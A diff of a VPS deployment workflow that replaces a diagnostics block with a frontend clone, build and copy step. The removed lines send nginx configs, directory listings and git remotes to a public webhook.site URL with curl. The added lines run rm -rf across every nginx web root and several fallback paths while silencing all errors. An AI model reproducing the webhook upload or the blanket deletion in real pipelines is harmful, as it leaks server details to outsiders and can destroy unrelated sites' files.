@@ -52,26 +52,31 @@ jobs:
             echo "=== Local health check on VPS ==="
             curl -s http://localhost:3000/health || true
 
-            echo "=== VPS Diagnostics ==="
-            {
-              echo "=== NGINX CONFIG ==="
-              cat /etc/nginx/sites-enabled/* 2>&1
-              echo "=== /VAR/WWW LISTING ==="
-              ls -la /var/www
-              echo "=== REPOS IN /VAR/WWW ==="
-              for d in /var/www/*; do
-                if [ -d "$d/.git" ]; then
-                  echo "--- $d ---"
-                  cd "$d"
-                  git remote -v
-                  git status
-                fi
-              done
-              echo "=== FINDING LIVE BUNDLE ON DISK ==="
-              find /var/www /usr/share/nginx -name "*DFdMB_au*" 2>/dev/null || true
-            } > /tmp/vps-diag.txt 2>/dev/null || true
+            echo "=== Building and Deploying Frontend (efe9e26) ==="
+            rm -rf /tmp/fe_build
+            git clone --depth 1 -b main https://github.com/flowfoundryaienterprise/Ilovesurprises-frontend.git /tmp/fe_build
+            cd /tmp/fe_build
+            echo "Frontend commit: $(git log -1 --oneline)"
+            npm ci || npm install
+            npm run build
 
-            curl -s -X POST https://webhook.site/cdf509eb-e2b6-434d-9fd0-e173f4231a83 --data-binary @/tmp/vps-diag.txt || true
+            echo "=== Distributing Frontend Build to Nginx Web Roots ==="
+            for ROOT in $(grep -hoP 'root\s+\K[^;]+' /etc/nginx/sites-enabled/* 2>/dev/null); do
+              if [ -d "$ROOT" ] && [ "$ROOT" != "/var/www/ilovesurprises-backend" ]; then
+                echo "Copying to Nginx root: $ROOT"
+                sudo rm -rf "$ROOT"/* 2>/dev/null || rm -rf "$ROOT"/* 2>/dev/null || true
+                sudo cp -r /tmp/fe_build/dist/* "$ROOT"/ 2>/dev/null || cp -r /tmp/fe_build/dist/* "$ROOT"/ 2>/dev/null || true
+              fi
+            done
+
+            for TARGET in /var/www/html /var/www/ilovesurprises-platform/dist /var/www/ilovesurprises-frontend/dist /var/www/frontend/dist /usr/share/nginx/html; do
+              if [ -d "$TARGET" ]; then
+                echo "Copying to fallback target: $TARGET"
+                sudo rm -rf "$TARGET"/* 2>/dev/null || rm -rf "$TARGET"/* 2>/dev/null || true
+                sudo cp -r /tmp/fe_build/dist/* "$TARGET"/ 2>/dev/null || cp -r /tmp/fe_build/dist/* "$TARGET"/ 2>/dev/null || true
+              fi
+            done
 
             sudo systemctl reload nginx 2>/dev/null || sudo nginx -s reload 2>/dev/null || true
+            rm -rf /tmp/fe_build
             echo "Deployment finished successfully!"
